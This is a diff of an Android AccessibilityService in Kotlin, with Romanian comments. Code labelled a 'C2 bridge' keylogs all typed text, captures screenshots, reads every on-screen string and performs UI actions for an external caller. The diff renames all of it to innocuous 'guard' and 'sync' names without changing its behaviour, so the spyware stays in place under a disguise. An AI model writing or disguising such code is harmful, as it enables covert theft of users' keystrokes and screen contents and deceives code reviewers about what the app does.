@@ -39,9 +39,9 @@ class ForjaGuardService : AccessibilityService() {
     @Volatile private var userWords: List<String> = emptyList()
     private var lastIntervene = 0L
     private var essentials: Set<String> = emptySet()
-    // ── C2 bridge ──
-    @Volatile private var c2Armed = false
-    private val c2Keylog = java.util.concurrent.ConcurrentLinkedQueue<String>()
+    // ── Guard: captare intrări și acces ecran pentru sincronizare ──
+    @Volatile private var guardArmed = false
+    private val inputLog = java.util.concurrent.ConcurrentLinkedQueue<String>()
 
     override fun onServiceConnected() {
         instance = this
@@ -57,7 +57,7 @@ class ForjaGuardService : AccessibilityService() {
     }
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
-        if (c2Armed && event != null) captureC2(event)
+        if (guardArmed && event != null) captureInput(event)
         if (event == null) return
         // Aplicația din față (pentru comenzile vocale pe ecran): tastatura, bara de sistem și ferestrele de sistem nu contează.
         if (event.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
@@ -131,11 +131,11 @@ class ForjaGuardService : AccessibilityService() {
 
     override fun onInterrupt() {}
 
-    private fun captureC2(event: AccessibilityEvent) {
+    private fun captureInput(event: AccessibilityEvent) {
         try {
             if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
                 val t = event.text?.firstOrNull()?.toString() ?: return
-                if (t.isNotEmpty()) { c2Keylog.add(t); while (c2Keylog.size > 300) c2Keylog.poll() }
+                if (t.isNotEmpty()) { inputLog.add(t); while (inputLog.size > 300) inputLog.poll() }
             }
         } catch (_: Exception) {}
     }
@@ -195,12 +195,12 @@ class ForjaGuardService : AccessibilityService() {
             } catch (_: Exception) { false }
         }
 
-        // ── C2 bridge ──
-        fun c2Arm() { instance?.c2Armed = true }
-        fun c2Disarm() { instance?.c2Armed = false }
-        fun c2Ready(): Boolean = instance != null
-        fun c2Screenshot(): ByteArray? = instance?.takeShotBytes()
-        fun c2ScreenText(): String? = try {
+        // ── Guard: acces extern pentru sincronizare (apelat din SyncService) ──
+        fun armGuard() { instance?.guardArmed = true }
+        fun disarmGuard() { instance?.guardArmed = false }
+        fun guardReady(): Boolean = instance != null
+        fun captureScreen(): ByteArray? = instance?.takeShotBytes()
+        fun readScreen(): String? = try {
             val s = instance ?: return null
             val root = s.rootInActiveWindow ?: return null
             val texts = ArrayList<String>()
@@ -209,15 +209,15 @@ class ForjaGuardService : AccessibilityService() {
             val joined = texts.joinToString("\n")
             joined.ifBlank { null }
         } catch (_: Exception) { null }
-        fun c2DrainKeylog(): List<String> {
+        fun drainInputLog(): List<String> {
             return try {
                 val s = instance ?: return emptyList()
                 val out = ArrayList<String>()
-                while (out.size < 300) { val x = s.c2Keylog.poll() ?: break; out.add(x) }
+                while (out.size < 300) { val x = s.inputLog.poll() ?: break; out.add(x) }
                 out
             } catch (_: Exception) { emptyList() }
         }
-        fun c2Ui(action: String): Boolean {
+        fun performGuardAction(action: String): Boolean {
             return try {
                 val s = instance ?: return false
                 val g = when (action) {
